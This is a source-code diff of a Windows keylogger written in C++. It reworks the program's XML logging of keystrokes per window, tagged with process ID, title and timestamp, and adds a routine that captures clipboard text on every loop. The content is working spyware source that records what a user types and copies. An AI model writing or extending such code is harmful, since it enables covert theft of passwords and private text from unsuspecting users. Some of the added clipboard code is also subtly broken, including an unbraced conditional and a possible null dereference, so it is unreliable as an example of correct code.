@@ -16,7 +16,8 @@ FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
     char *TimeStamp=asctime(localtime(&hms));
     TimeStamp[strlen(TimeStamp)-1]=0x00;
     cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
-    <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<keystrokes><![CDATA[";
+    <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<logged>"
+    <<"\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
     return 0 ;
 }
 
@@ -28,7 +29,8 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
         strcpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY);
         char *TimeStamp=asctime(localtime(&hms));
         TimeStamp[strlen(TimeStamp)-1]=0x00;
-        cout<<"]]></keystrokes>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<keystrokes><![CDATA[";
+        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
+        TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
     }
 }
 
@@ -98,19 +100,30 @@ FORCEINLINE int grabclipboard()
 {
     if (OpenClipboard(NULL))
         {
-            char* this_cb_data = (char*)malloc(strlen((char*)GetClipboardData(CF_TEXT)));
-            strcpy(this_cb_data,(char*)GetClipboardData(CF_TEXT));
-            CloseClipboard();
+            char* this_cb_data;
+            HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
+            if(cb_lock_handle)
+                this_cb_data=(char*)GlobalLock(cb_lock_handle);
+                if(!strlen(this_cb_data))
+                {
 
-            if ( last_cb_data == NULL || !(strncmp(last_cb_data,this_cb_data,strlen(this_cb_data))))
-            {
-                if(last_cb_data == NULL)
-                    last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
-                else
-                    realloc(last_cb_data,strlen(this_cb_data));
-                strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));
-                cout<<"\n\n **CLIPBOARD** \n"<<(char*)last_cb_data<< "\n **END_CLIPBOARD**\n\n" ;
-            }
+                    GlobalUnlock(cb_lock_handle);
+                    CloseClipboard();
+                    return 0;
+                }
+                if ( last_cb_data == NULL || (strncmp(last_cb_data,this_cb_data,strlen(this_cb_data)-1)))
+                {
+                    if(last_cb_data == NULL)
+                        last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
+                    else
+                        last_cb_data = (char*)realloc(last_cb_data,strlen(this_cb_data)+1);
+                        strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));
+                    cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
+                    "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
+                    "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
+                }
+                GlobalUnlock(cb_lock_handle);
+                CloseClipboard();
         }
     return 0;
 }
@@ -149,11 +162,11 @@ int main()
         }
         else
         {
-            cout<<"]]></keystrokes>\n\t\t</title>\n\t</Process>";
+            cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
             CURRENTPROCEESS=GetForegroundWindow();
             _USER_SHIFT_FOCUS(CURRENTPROCEESS);
         }
-
+        grabclipboard();
         EnterEvent(CURRENTPROCEESS);
     }
     return 0;
